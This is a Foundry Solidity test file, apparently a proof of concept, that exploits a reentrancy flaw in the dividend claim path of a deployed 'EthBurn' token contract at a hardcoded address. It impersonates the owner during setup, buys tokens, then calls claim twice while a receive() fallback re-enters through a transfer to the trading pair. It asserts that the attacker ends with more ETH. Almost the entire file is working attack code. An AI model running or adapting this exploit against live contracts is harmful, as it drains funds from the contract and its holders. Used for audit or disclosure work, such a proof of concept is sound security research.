// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface EthBurnDividendTracker {
    function setMinimumTokenBalanceForDividends(uint256 value) external;
}

interface EthBurn {
    function owner() external view returns (address);
    function dividendTracker() external view returns (EthBurnDividendTracker);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function uniswapV2Pair() external view returns (address);
    function swapTokensAtAmount() external view returns (uint256);
    function setTrueDefiRouter(address _router) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function claim() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;
    address attacker = address(this);
    EthBurn target;
    EthBurnDividendTracker tracker;
    IUniswapV2Router02 router;
    IUniswapV2Pair pair;
    address weth;
    address owner;
    bool reentrancy_flag = false;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        EthBurn target_ = EthBurn(TARGET);
        target = target_;
        owner = target.owner();
        tracker = target.dividendTracker();
        router = target.uniswapV2Router();
        pair = IUniswapV2Pair(target.uniswapV2Pair());
        weth = router.WETH();

        deal(address(this), 100 ether);

        // Fund tracker with ETH for dividends
        deal(address(tracker), 10 ether);

        // Enable trading and other preconditions by impersonating the owner
        vm.startPrank(owner);
        target.setTrueDefiRouter(address(router));
        // Set minimum balance for dividends to 0 to ensure we are included
        tracker.setMinimumTokenBalanceForDividends(0);
        vm.stopPrank();

        // Buy some EthBurn tokens to be a token holder
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(target);
        router.swapExactETHForTokens{value: 5 ether}(
            0,
            path,
            address(this),
            block.timestamp
        );

        // Fund the contract with enough tokens to trigger swapAndSendDividends
        uint256 swapAmount = target.swapTokensAtAmount();
        vm.startPrank(owner);
        target.transfer(TARGET, swapAmount);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // 1. First claim triggers the re-entrancy via the receive() fallback
        target.claim();

        // 2. Second claim withdraws the profit from the inflated dividend pool
        target.claim();

        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {
        if (!reentrancy_flag) {
            reentrancy_flag = true;
            // This re-entrant call is a "sell" that triggers swapAndSendDividends
            // because the `swapping` guard is not set.
            target.transfer(address(pair), 1e18);
        }
    }
}

